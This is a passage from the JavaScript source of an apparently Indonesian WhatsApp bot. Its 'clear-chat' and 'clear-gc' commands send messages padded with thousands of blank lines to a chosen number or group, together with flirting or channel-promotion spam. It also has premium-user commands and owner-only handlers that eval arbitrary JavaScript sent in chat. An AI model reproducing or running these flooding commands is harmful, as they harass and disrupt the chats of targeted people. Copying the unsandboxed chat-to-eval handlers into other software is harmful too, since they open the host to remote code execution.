break

case 'clear-chat': {
if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyy.sendMessage(BapakLuWkwk, {text: `💞 𝐤𝐚𝐤 𝐚𝐤𝐮 𝐜𝐢𝐧𝐭𝐚 𝐤𝐚𝐦𝐮 😖 👉🏻👈🏻 @𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nn\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("done clear chat by Andrazyy 😖")
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'clear-gc':
case 'group-clear': {
m.reply(`.clear-gc sedang di proses

*⪻ 𝐌𝐚𝐬𝐮𝐤 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐆𝐰 𝐖𝐨𝐲 ⪼*
${global.Andrazyy6}

GAK MASUK GW SPAM TERUS 😹
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n

*⪻ 𝐌𝐚𝐬𝐮𝐤 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐆𝐰 𝐖𝐨𝐲 ⪼*
${global.Andrazyy6}

GAK MASUK GW SPAM TERUS 😹`)
}
break

case 'addprem': case 'addacces': {
if (!Access) return Andrazyyreply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return Andrazyyreply(`mana nomornya dan mau berapa hari? contoh : ${prefix + command} @tag|30d`)
    if (!hari) return Andrazyyreply(`mau yang berapa hari njrr?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return Andrazyyreply('lol, owner kan bebas')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return Andrazyyreply('Suscesfully add premium🐉')
    let data = await Andrazyy.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium🐉')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://i.ibb.co/0yzbz02m/1059.jpg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q'
                }	
            }	
        };	
        return Andrazyy.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         Andrazyyreply("not found")
    }	
}
break

case 'owner': case 'own': {
m.reply(`https://${global.owner} NIH OWNER GW, JANGAN MACEM MACEM.!!
> Andrazyy Agler Forger`)
}
break
                
case 'delprem': case 'delacces': {
if (!Access) return Andrazyyreply(mess.owner)
    if (!args[0]) return Andrazyyreply(`siapa yang mau di ${command}? gunakan nomor/tag, contoh : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return Andrazyyreply("bukan user premium ini mah")
    let data = await Andrazyy.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        Andrazyyreply('user tersebut telah di hapus')
    } else {	
        Andrazyyreply("not found")
    }
}
break

case 'public': {
if (!isPremium) return Andrazyyreply(" maaf kamu tidak memiliki akses ")
Andrazyy.public = true
Andrazyyreply(`*berhasil mengubah bot ke mode public*`)
}
break

case 'self': {
if (!isPremium) return Andrazyyreply(" maaf kamu tidak memiliki akses ")
Andrazyy.public = false
Andrazyyreply(`*berhasil mengubah bot ke mode self*`)
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
